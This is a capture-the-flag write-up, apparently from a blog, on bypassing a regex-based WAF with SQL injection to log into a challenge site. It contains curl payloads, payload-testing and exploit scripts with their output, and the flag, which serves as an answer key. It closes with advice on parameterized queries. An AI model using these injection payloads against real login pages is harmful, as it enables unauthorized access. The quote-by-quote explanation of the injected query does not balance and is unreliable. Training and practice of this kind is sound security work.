---
date: 2025-11-12 7:00:00
categories:
  - zetech
title: w00f w00f
tags:
  - web
  - sqlinjection
  - waf
description: CyberChiefGames - WAF bypass challenge
---

## The Challenge

Our over-eager cyber intern tried to secure the login page using nothing but regex, optimism, and duct tape. The result: an aggressive WAF that loudly blocks common exploit patterns and quietly ignores everything else. Your task is to politely outsmart the intern's handiwork, bypass the filter, and reach the dashboard to retrieve the flag.

**Target:** `http://simulations.cyberchiefgames.tech:5000/`

## Initial Reconnaissance

First, let me show you what we're working with. The application presents a simple login form:

```html
<form method="POST" action="/submit" autocomplete="off">
  <div>
    <label for="username">Username</label>
    <input id="username" name="payload" type="text" autocomplete="off" required autofocus>
  </div>
  <div>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="off">
  </div>
  <button type="submit">Sign in</button>
</form>
```

Interesting detail: the username field is named `payload` - this is a hint that the username field is what we'll be exploiting. The form submits to `/submit` endpoint.

The challenge description mentions a regex-based WAF that blocks "common exploit patterns" - this suggests we're dealing with a SQL injection vulnerability that's protected by an imperfect filter.

## Understanding the WAF Behavior

Let's test what gets blocked. The challenge description mentions that normal SQL injection payloads like `'or '1'='1` don't work, but `admin' = 'admin` does. Let's systematically test different payloads:

```bash
# Common SQL injection - BLOCKED ‚ùå
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload='or '1'='1&password=test"
# Response: "WAF blocked ‚Äî exploit detected"

# Simple equality without spaces - BLOCKED ‚ùå
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin'='admin&password=test"
# Response: "WAF blocked ‚Äî exploit detected"

# Simple equality with spaces - SUCCESS ‚úÖ
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin' = 'admin'&password=test"
# Response: Redirect to /dashboard
```

## The WAF Bypass

The key insight is that the regex-based WAF is looking for specific patterns without accounting for whitespace. Let's analyze what makes the bypass work:

### Why Common Payloads Fail

The WAF likely checks for patterns like:
- `'or'` or `'OR'` (case-insensitive)
- `'1'='1'` or `'1'='1`
- `'='` (equals signs between quotes)
- Common SQL keywords like `UNION`, `SELECT`, `AND`

So payloads like:
- `'or '1'='1` - Contains `'or'` pattern
- `admin'='admin` - Contains `'='` pattern
- `admin'='admin'--` - Contains `'='` and comment markers

All get blocked by the regex patterns.

### The Working Bypass

The payload `admin' = 'admin'` works because:

1. **Spaces around `=`**: The WAF regex probably checks for `'='` (quotes directly around equals) but doesn't account for spaces: `' = '`
2. **Trailing quote**: The trailing quote `'` after `admin` completes the SQL injection properly
3. **No SQL keywords**: Doesn't contain `OR`, `AND`, `UNION`, `SELECT` which are likely blacklisted
4. **Simple equality**: Uses a basic string comparison that evaluates to TRUE

### SQL Query Structure

The vulnerable query likely looks like:
```sql
SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = '[PASSWORD]'
```

When we inject `admin' = 'admin'`, the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' = 'admin'' AND password = 'test'
```

**How the injection works:**
1. The first `'` closes the opening quote from the template
2. `admin'` becomes the string literal `'admin'`
3. ` = 'admin'` creates a comparison: `'admin' = 'admin'` which evaluates to TRUE
4. The trailing `'` opens a new quote that gets closed by the template's closing quote

The key insight is that `'admin' = 'admin'` is a boolean expression that always evaluates to TRUE, effectively bypassing the username check in the WHERE clause. This allows the query to return results even when the username doesn't match any records in the database.

## Testing the Bypass

Let's create a Python script to systematically test payloads and confirm the bypass:

```python
#!/usr/bin/env python3
import requests

url = "http://simulations.cyberchiefgames.tech:5000/submit"

test_payloads = [
    "'or '1'='1",                    # Common SQLi - BLOCKED
    "admin'='admin",                 # Simple equality - BLOCKED
    "admin' = 'admin'",              # With spaces - SUCCESS!
    "admin'='admin'",                # No spaces - BLOCKED
    "admin' = 'admin",               # Missing trailing quote - BLOCKED
]

for payload in test_payloads:
    resp = requests.post(url, data={"payload": payload, "password": "test"}, allow_redirects=False)
    
    if "WAF blocked" in resp.text:
        print(f"‚ùå BLOCKED: {payload}")
    elif resp.status_code == 302 and "/dashboard" in resp.headers.get("Location", ""):
        print(f"‚úÖ SUCCESS: {payload}")
        print(f"   Redirects to: {resp.headers['Location']}")
    else:
        print(f"‚ö†Ô∏è  UNKNOWN: {payload} (Status: {resp.status_code})")
```

**Output:**
```
‚ùå BLOCKED: 'or '1'='1
‚ùå BLOCKED: admin'='admin
‚úÖ SUCCESS: admin' = 'admin'
   Redirects to: /dashboard
‚ùå BLOCKED: admin'='admin'
‚ùå BLOCKED: admin' = 'admin
```

## The Exploit

Now that we've identified the bypass, let's execute it and retrieve the flag:

```bash
# Exploit the SQL injection
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin' = 'admin'&password=anything" \
  -L -c cookies.txt

# Access the dashboard
curl -b cookies.txt http://simulations.cyberchiefgames.tech:5000/dashboard
```

**Response from dashboard:**
```html
<!doctype html>
<html lang="en">
<head>
  <title>Dashboard</title>
</head>
<body>
  <div class="card">
    <h1>Welcome</h1>
    <div class="flag">ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}</div>
    <div><a href="/logout">Sign out</a></div>
  </div>
</body>
</html>
```

## Complete Exploit Script

Here's a complete Python script to automate the exploit:

```python
#!/usr/bin/env python3
import requests
import re

def exploit():
    url = "http://simulations.cyberchiefgames.tech:5000/submit"
    
    # The magic payload that bypasses the WAF
    payload = "admin' = 'admin'"
    
    print(f"[*] Attempting WAF bypass with payload: {payload}")
    
    # Perform the SQL injection
    session = requests.Session()
    response = session.post(
        url,
        data={"payload": payload, "password": "anything"},
        allow_redirects=False
    )
    
    # Check if we bypassed the WAF
    if "WAF blocked" in response.text:
        print("‚ùå WAF blocked the payload")
        return False
    
    # Follow redirect to dashboard
    if response.status_code == 302:
        dashboard_url = response.headers.get("Location")
        print(f"[*] Redirected to: {dashboard_url}")
        
        if dashboard_url:
            dashboard_response = session.get(
                f"http://simulations.cyberchiefgames.tech:5000{dashboard_url}"
            )
            
            # Extract flag
            flag_match = re.search(r'ZuH4ckN1ght\{[^}]+\}', dashboard_response.text)
            if flag_match:
                print(f"üö© FLAG FOUND: {flag_match.group(0)}")
                return True
    
    print("‚ö†Ô∏è  Could not retrieve flag")
    return False

if __name__ == "__main__":
    exploit()
```

**Output:**
```
[*] Attempting WAF bypass with payload: admin' = 'admin'
[*] Redirected to: /dashboard
üö© FLAG FOUND: ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}
```

## Why This WAF Failed

The regex-based WAF failed because it looked for specific attack patterns without considering variations:

1. **Whitespace Insensitivity**: The WAF checked for `'='` but not `' = '` (with spaces)
2. **Pattern Matching Limitations**: Regex patterns can't account for all possible bypass techniques
3. **No Context Understanding**: The WAF doesn't understand SQL syntax, just pattern matching
4. **Whitelist vs Blacklist**: Blacklisting is inherently flawed - you can't anticipate all bypasses

### Common WAF Bypass Techniques

This challenge demonstrates several important WAF bypass concepts:

1. **Whitespace Manipulation**: Adding spaces around operators can break pattern matching
2. **Pattern Variations**: Simple variations of blocked patterns may not be caught
3. **No SQL Keywords**: Avoiding common SQL injection keywords (OR, AND, UNION) can bypass keyword-based filters
4. **Simple Comparisons**: Using basic string comparisons instead of complex boolean logic

## Key Takeaways

This challenge was a perfect example of why **regex-based WAFs are insufficient** for preventing SQL injection:

1. **Pattern Matching Limitations**: Regex can't catch all variations of attacks
2. **Whitespace Bypass**: Simple spacing differences can break pattern matching
3. **Blacklist Inadequacy**: You can't blacklist all possible attack vectors
4. **Defense in Depth**: WAFs should be one layer, not the only layer

## How to Fix This

The proper solution is to fix the underlying vulnerability, not rely on a WAF:

```python
# ‚ùå BAD - String concatenation vulnerable to SQL injection
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# ‚úÖ GOOD - Parameterized queries (prepared statements)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

**If you must use a WAF:**
- Use a proper WAF solution (ModSecurity, Cloudflare, etc.)
- Don't rely on simple regex patterns
- Implement multiple layers of defense
- Use whitelisting where possible instead of blacklisting
- Regularly update and test WAF rules

**Flag:** `ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}`

This challenge beautifully demonstrates that regex-based WAFs are no substitute for proper input validation and parameterized queries. The key lesson: **fix the root cause, don't just patch the symptoms**.

---

